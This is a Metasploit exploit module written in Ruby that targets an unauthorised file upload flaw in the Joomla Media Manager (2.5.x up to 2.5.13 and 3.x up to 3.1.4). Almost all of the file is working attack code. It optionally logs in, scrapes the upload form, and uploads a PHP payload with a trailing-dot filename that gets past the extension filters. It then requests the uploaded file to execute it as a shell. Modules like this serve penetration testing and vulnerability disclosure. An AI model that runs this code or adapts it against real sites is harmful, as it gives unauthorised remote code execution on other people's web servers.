##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla Media Manager File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13, as well as
        3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component,
        which comes by default in Joomla, allowing arbitrary file uploads, and results in
        arbitrary code execution. The module has been tested successfully on Joomla 2.5.13
        and 3.1.4 on Ubuntu 10.04. Note: If public access isn't allowed to the Media
        Manager, you will need to supply a valid username and password (Editor role or
        higher) in order to work properly.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jens Hinrichsen', # Vulnerability discovery according to the OSVDB
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '95933' ],
          [ 'URL', 'http://developer.joomla.org/security/news/563-20130801-core-unauthorised-uploads' ],
          [ 'URL', 'http://www.cso.com.au/article/523528/joomla_patches_file_manager_vulnerability_responsible_hijacked_websites/' ],
          [ 'URL', 'https://github.com/joomla/joomla-cms/commit/fa5645208eefd70f521cd2e4d53d5378622133d8' ],
          [ 'URL', 'http://niiconsulting.com/checkmate/2013/08/critical-joomla-file-upload-vulnerability/' ]
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it's unlimited
          'Space'       => 262144, # 256k
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla 2.5.x <=2.5.13', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 01 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla']),
          OptString.new('USERNAME', [false, 'User to login with', '']),
          OptString.new('PASSWORD', [false, 'Password to login with', '']),
        ], self.class)

  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def check
    res = get_upload_form

    if res and res.code == 200
      if res.body =~ /You are not authorised to view this resource/
        print_status("#{peer} - Joomla Media Manager Found but authentication required")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /<form action="(.*)" id="uploadForm"/
        print_status("#{peer} - Joomla Media Manager Found and authentication isn't required")
        return Exploit::CheckCode::Detected
      end
    end

    return Exploit::CheckCode::Safe
  end

  def upload(upload_uri)
    begin
      u = URI(upload_uri)
    rescue ::URI::InvalidURIError
      fail_with(Exploit::Failure::Unknown, "Unable to get the upload_uri correctly")
    end

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, "application/x-php", nil, "form-data; name=\"Filedata[]\"; filename=\"#{@upload_name}.\"")
    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => "#{u.path}?#{u.query}",
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'cookie'   => @cookies,
      'vars_get' => {
        'asset'  => 'com_content',
        'author' => '',
        'format' => '',
        'view'   => 'images',
        'folder' => ''
      },
      'data'     => post_data
    })

    return res

  end

  def get_upload_form
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php"),
      'cookie'   => @cookies,
      'encode_params' => false,
      'vars_get' => {
        'option' => 'com_media',
        'view'   => 'images',
        'tmpl'   => 'component',
        'e_name' => 'jform_articletext',
        'asset'  =>  'com_content',
        'author' => ''
      }
    })

    return res
  end

  def get_login_form

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php", "component", "users", "/"),
      'cookie'   => @cookies,
      'vars_get' => {
        'view' => 'login'
      }
    })

    return res

  end

  def login
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "index.php", "component", "users", "/"),
      'cookie'   => @cookies,
      'vars_get' => {
        'task' => 'user.login'
      },
      'vars_post' => {
        'username' => @username,
        'password' => @password
        }.merge(@login_options)
      })

    return res
  end

  def parse_login_options(html)
    html.scan(/<input type="hidden" name="(.*)" value="(.*)" \/>/) {|option|
      @login_options[option[0]] = option[1] if option[1] == "1" # Searching for the Token Parameter, which always has value "1"
    }
  end

  def exploit
    @login_options = {}
    @cookies = ""
    @upload_name = "#{rand_text_alpha(rand(5) + 3)}.php"
    @username = datastore['USERNAME']
    @password = datastore['PASSWORD']

    print_status("#{peer} - Checking Access to Media Component...")
    res = get_upload_form

    if res and res.code == 200 and res.headers['Set-Cookie'] and res.body =~ /You are not authorised to view this resource/
      print_status("#{peer} - Authentication required... Proceeding...")

      if @username.empty? or @password.empty?
        fail_with(Exploit::Failure::BadConfig, "#{peer} - Authentication is required to access the Media Manager Component, please provide credentials")
      end
      @cookies = res.get_cookies.sub(/;$/, "")

      print_status("#{peer} - Accessing the Login Form...")
      res = get_login_form
      if res.nil? or res.code != 200 or res.body !~ /login/
        fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to Access the Login Form")
      end
      parse_login_options(res.body)

      res = login
      if not res or res.code != 303
        fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to Authenticate")
      end
    elsif res and res.code ==200 and res.headers['Set-Cookie'] and res.body =~ /<form action="(.*)" id="uploadForm"/
      print_status("#{peer} - Authentication isn't required.... Proceeding...")
      @cookies = res.get_cookies.sub(/;$/, "")
    else
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Failed to Access the Media Manager Component")
    end

    print_status("#{peer} - Accessing the Upload Form...")
    res = get_upload_form

    if res and res.code == 200 and res.body =~ /<form action="(.*)" id="uploadForm"/
      upload_uri = Rex::Text.html_decode($1)
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to Access the Upload Form")
    end

    print_status("#{peer} - Uploading shell...")

    res = upload(upload_uri)

    if res.nil? or res.code != 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Upload failed")
    end

    register_files_for_cleanup("#{@upload_name}.")
    print_status("#{peer} - Executing shell...")
    send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "images", @upload_name),
    })

  end

end
